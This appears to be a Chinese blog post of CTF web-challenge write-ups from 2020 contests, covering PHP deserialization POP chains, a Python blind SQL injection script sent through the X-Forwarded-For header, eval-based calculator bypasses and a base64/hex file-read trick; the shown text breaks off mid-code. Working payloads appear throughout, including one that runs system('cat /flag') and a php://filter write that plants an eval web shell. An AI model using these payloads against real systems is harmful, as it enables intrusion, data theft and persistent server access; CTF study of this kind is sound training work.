<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>web比赛题目，最新更新11/9/2020 | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="NULL signinhttp:&#x2F;&#x2F;101.32.205.189&#x2F; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php class ip &amp;#123;    public $ip;    public function waf($info)&amp;#123;">
<meta property="og:type" content="article">
<meta property="og:title" content="web比赛题目，最新更新11&#x2F;9&#x2F;2020">
<meta property="og:url" content="https://zmh2000829.github.io/2020/10/18/ctf-web9/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="NULL signinhttp:&#x2F;&#x2F;101.32.205.189&#x2F; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php class ip &amp;#123;    public $ip;    public function waf($info)&amp;#123;">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://zmh2000829.github.io/2020/10/18/ctf-web9/1.png">
<meta property="og:image" content="https://zmh2000829.github.io/2020/10/18/ctf-web9/2.png">
<meta property="og:image" content="https://zmh2000829.github.io/2020/10/18/ctf-web9/3.png">
<meta property="og:image" content="https://zmh2000829.github.io/2020/10/18/ctf-web9/4.png">
<meta property="og:image" content="https://zmh2000829.github.io/2020/10/18/ctf-web9/5.png">
<meta property="og:image" content="https://zmh2000829.github.io/2020/10/18/ctf-web9/6.png">
<meta property="og:image" content="https://zmh2000829.github.io/2020/10/18/ctf-web9/7.png">
<meta property="og:image" content="https://zmh2000829.github.io/2020/10/18/ctf-web9/8.png">
<meta property="og:image" content="https://zmh2000829.github.io/2020/10/18/ctf-web9/10.png">
<meta property="og:image" content="https://zmh2000829.github.io/2020/10/18/ctf-web9/9.png">
<meta property="og:image" content="https://zmh2000829.github.io/2020/10/18/ctf-web9/11.png">
<meta property="og:image" content="https://zmh2000829.github.io/2020/10/18/ctf-web9/12.png">
<meta property="og:image" content="https://zmh2000829.github.io/2020/10/18/ctf-web9/13.png">
<meta property="og:image" content="https://zmh2000829.github.io/2020/10/18/ctf-web9/14.png">
<meta property="article:published_time" content="2020-10-18T09:44:00.000Z">
<meta property="article:modified_time" content="2020-11-16T15:02:08.255Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="一些比赛题目">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://zmh2000829.github.io/2020/10/18/ctf-web9/1.png">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://zmh2000829.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-ctf-web9" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/10/18/ctf-web9/" class="article-date">
  <time datetime="2020-10-18T09:44:00.000Z" itemprop="datePublished">2020-10-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      web比赛题目，最新更新11/9/2020
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="NULL-signin"><a href="#NULL-signin" class="headerlink" title="NULL signin"></a>NULL signin</h3><p><a href="http://101.32.205.189/" target="_blank" rel="noopener">http://101.32.205.189/</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ip</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $ip;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="keyword">$this</span>-&gt;waf($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip =$_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $con=mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"********"</span>,<span class="string">"n1ctf_websign"</span>);</span><br><span class="line">        $sqlquery=sprintf(<span class="string">"INSERT into n1ip(`ip`,`time`) VALUES ('%s','%s')"</span>,<span class="keyword">$this</span>-&gt;waf($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]),time());</span><br><span class="line">        <span class="keyword">if</span>(!mysqli_query($con,$sqlquery))&#123;</span><br><span class="line">            <span class="keyword">return</span> mysqli_error($con);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"your ip looks ok!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        mysqli_close($con);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $ip;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ip)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ip = $ip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span>&#123;</span><br><span class="line">    	<span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;check)===md5(<span class="string">"key****************"</span>))&#123;</span><br><span class="line">    		readfile(<span class="string">'/flag'</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;ip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stristr(<span class="keyword">$this</span>-&gt;ip, <span class="string">"n1ctf"</span>)!==<span class="keyword">False</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">"welcome to n1ctf2020"</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;ip = <span class="string">"noip"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;getflag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'input'</span>]))&#123;</span><br><span class="line">    $input = $_GET[<span class="string">'input'</span>];</span><br><span class="line">	unserialize($input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>insert 注入     </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span>(col1,col2) <span class="keyword">values</span> (<span class="string">'aaa'</span>,<span class="string">'bbb'</span>)</span><br><span class="line"><span class="string">''</span>,<span class="keyword">if</span>(<span class="number">1</span>,extracevalue...开始注入) <span class="comment">-- ','bbb'</span></span><br></pre></td></tr></table></figure>

<p>pop链：flag-&gt;ip=ip类 flag-&gt;wakeup stristr =&gt;  ip-&gt;toString</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$B = <span class="keyword">new</span> ip();</span><br><span class="line">$B-&gt;ip = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$A = <span class="keyword">new</span> flag($B);<span class="comment">//填充__construct的参数</span></span><br><span class="line">$A-&gt;check = <span class="string">"key"</span>;</span><br><span class="line">$A-&gt;ip = $B;<span class="comment">//通过unserialize调用flag类的__wakeup函数，执行stristr函数是会将$B看成字符将会调用ip类的__toString获取类字符信息的方法，在对数据库insert操作时进行sql注入</span></span><br><span class="line">$res = serialize($A);</span><br><span class="line"><span class="keyword">echo</span> $res;</span><br></pre></td></tr></table></figure>

<p>然后在toString方法里构造xff注入，试了下只能盲注，延时函数被waf了，就只能布尔盲注，通过构造报错注入，返回”welcome to n1ctf2020“即为return mysqli_error($con); 而返回”noip” 即为return “your ip looks ok!”;，来完成布尔盲注完整代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://101.32.205.189/?input=O:4:"flag":2:&#123;s:2:"ip";O:2:"ip":1:&#123;s:2:"ip";s:9:"127.0.0.1";&#125;s:5:"check";s:3:"111";&#125;'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">30</span>,<span class="number">127</span>):</span><br><span class="line">        headers = &#123;<span class="comment"># - 是因为那些是mysql的计算符号要和前面的语句连起来 不能有语法错误</span></span><br><span class="line">            <span class="string">'X-Forwarded-For'</span>: <span class="string">"',if(1,extractvalue(1,concat(0x5c,(if(ascii(substr((select group_concat(A.key) from n1key A),&#123;&#125;,1))=&#123;&#125;,'n1ctf',2)))),1) or '"</span>.format(str(i), str(j))</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(url=url, headers=headers)</span><br><span class="line">        z = r.text.split(<span class="string">'\n'</span>)[<span class="number">-4</span>:]</span><br><span class="line">        z = z[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'noip'</span> <span class="keyword">not</span> <span class="keyword">in</span> z:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#O:4:"flag":2:&#123;s:2:"ip";O:2:"ip":1:&#123;s:2:"ip";s:9:"127.0.0.1";&#125;s:5:"check";s:3:"key";&#125;</span></span><br></pre></td></tr></table></figure>

<p>首先我们有select database() 找到数据库名字是n1ctf_websign</p>
<p>在如下图1找到当前数据库对应的表，代码如下，发现表名n1i，n1key，显然flag在n1key中</p>
<p>在如下图2找到当前数据库n1key表的列，代码如下，发现列名id，key</p>
<p>当group_concat(key)时却发现出现的都是乱码…无法获取字段名！！使用别名填充</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123; <span class="comment">#1</span></span><br><span class="line">            <span class="string">'X-Forwarded-For'</span>: <span class="string">"'/if(0,extractvalue(1,concat(0x7e,(if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;,'n1ctf',2)))),1) or '"</span>.format(str(i), str(j))</span><br><span class="line">        &#125;</span><br><span class="line">headers = &#123; <span class="comment">#2</span></span><br><span class="line">            <span class="string">'X-Forwarded-For'</span>: <span class="string">"'/if(0,extractvalue(1,concat(0x7e,(if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='n1key'),&#123;&#125;,1))=&#123;&#125;,'n1ctf',2)))),1) or '"</span>.format(str(i), str(j))</span><br><span class="line">        &#125;</span><br><span class="line">headers = &#123; <span class="comment">#3</span></span><br><span class="line">            <span class="string">'X-Forwarded-For'</span>: <span class="string">"'/if(0,extractvalue(1,concat(0x7e,(if(ascii(substr((select group_concat(bb.key) from n1key bb),&#123;&#125;,1))=&#123;&#125;,'n1ctf',2)))),1) or '"</span>.format(str(i), str(j))</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>成功拿到flag –&gt; flag{n1ctf20205bf75ab0a30dfc0c}</p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><div style="width:90%;margin:auto"><img src="/2020/10/18/ctf-web9/1.png" class></div>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'#calc'</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">"calc.php?num="</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">"#content"</span>).val()),</span><br><span class="line">        type:<span class="string">'GET'</span>,</span><br><span class="line">        success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">            $(<span class="string">"#result"</span>).html(<span class="string">`&lt;div class="alert alert-success"&gt;</span></span><br><span class="line"><span class="string">        &lt;strong&gt;答案:&lt;/strong&gt;<span class="subst">$&#123;data&#125;</span></span></span><br><span class="line"><span class="string">        &lt;/div&gt;`</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        error:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            alert(<span class="string">"这啥?算不来!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>php特性：需要将所有参数转换为有效的变量名，解析字符串时：1、删除初始空格；2、将某些字符转化为下划线</p>
<p>在构造参数<code>? num=phpinfo()</code>（num前面有个空格）就能够绕过，前端无法解析，但后端可以，绕过前端waf</p>
<p>通过多次尝试发现输入的有字符js就会跳到error：function，waf不允许num变量传递字母，可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉。</p>
<p>file_get_content($a)函数：函数把整个文件读入一个字符串中</p>
<p>var_dump($a)函数：判断变量的类型与长度,并输出变量的数值,如果变量有值输的是变量的值并回返数据类型.</p>
<p>scandir($a)函数：扫描出制定目录下的所有文件，$a 是 . 的时候输出子目录，是 / 的时候输出当前全部目录</p>
<p>chr($a)函数：函数从指定的 ASCII 值返回字符</p>
<p>构造payload  calc.php?%20num=var_dump(scandir(chr(47))) 列出当前目录全部文件</p>
<div style="width:90%;margin:auto"><img src="/2020/10/18/ctf-web9/2.png" class></div>

<p>构造payload  %20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))  “/flagg” 列出该目录下的文件，</p>
<p>成功拿到flag –&gt; flag{efb21e2a-b776-4877-bacb-f0bd4bcfe4cc}</p>
<h3 id="2020全国工业互联网安全技术技能大赛-simple-calculator"><a href="#2020全国工业互联网安全技术技能大赛-simple-calculator" class="headerlink" title="[2020全国工业互联网安全技术技能大赛] simple calculator"></a>[2020全国工业互联网安全技术技能大赛] simple calculator</h3><p>进入题目如图</p>
<div style="width:90%;margin:auto"><img src="/2020/10/18/ctf-web9/3.png" class></div>

<p>多次尝试发现除了php math库函数其余的函数已经全部被过滤</p>
<p>search=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&amp;0=system&amp;1=cat%20/flag</p>
<p><a href="http://eci-2zegsp1aou4jdyibk8km.cloudeci1.ichunqiu.com/7fa3b767c460b54a2be4d49030b349c7.php?content=?content=php://filter/write=string.strip_tags|zlib.inflate|?&gt;" target="_blank" rel="noopener">http://eci-2zegsp1aou4jdyibk8km.cloudeci1.ichunqiu.com/7fa3b767c460b54a2be4d49030b349c7.php?content=?content=php://filter/write=string.strip_tags|zlib.inflate|?&gt;</a><?php+eval($_GET[a]);?>&lt;?/resource=shell.php</p>
<h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><div style="width:90%;margin:auto"><img src="/2020/10/18/ctf-web9/4.png" class></div>

<p>看到备份网站，直接***/<a href="http://www.zip发现下载包，打开后是源码" target="_blank" rel="noopener">www.zip发现下载包，打开后是源码</a></p>
<p>先看index.php发现隐藏的该段代码，再看class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'class.php'</span>;</span><br><span class="line">    $select = $_GET[<span class="string">'select'</span>];</span><br><span class="line">    $res=unserialize(@$select);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'nonono'</span>;</span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'yesyes'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($username,$password)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = $username;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">'guest'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> $flag;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!"</span>;</span><br><span class="line">            <span class="keyword">die</span>();         </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Name(<span class="string">'admin'</span>,<span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造Name类后直接序列化，得到</p>
<p>O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}</p>
<p>但是对于private方法上述在反序列化后并没有改到，需要在类 和 参数前加 %00</p>
<p>O:4:”Name”:2:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p>
<p>由于反序列化会直接调用__wakeup()函数，我们需要绕过该方法，将Name类的2改成大于2 的数</p>
<p>select=O:4:”Name”:2:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p>
<p>得到flag</p>
<h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><div style="width:90%;margin:auto"><img src="/2020/10/18/ctf-web9/5.png" class></div>

<p>首先看到url—index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</p>
<div style="width:90%;margin:auto"><img src="/2020/10/18/ctf-web9/6.png" class></div>

<p>看到整个图片的base64编码，推测把url的img的值改为index.php可以输出index.php的base64</p>
<p>对TXpVek5UTTFNbVUzTURabE5qYz0=两次base64解密得到3535352e706e67</p>
<p>hex2str得到555.png，于是我们把index.php 先str2hex再base64加密两次，得到TmprMlpUWTBOalUzT0RKbE56QTJPRGN3，</p>
<p>构造url  index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=</p>
<p>得到index.php的base64，解密后得到源码如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixi～ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span 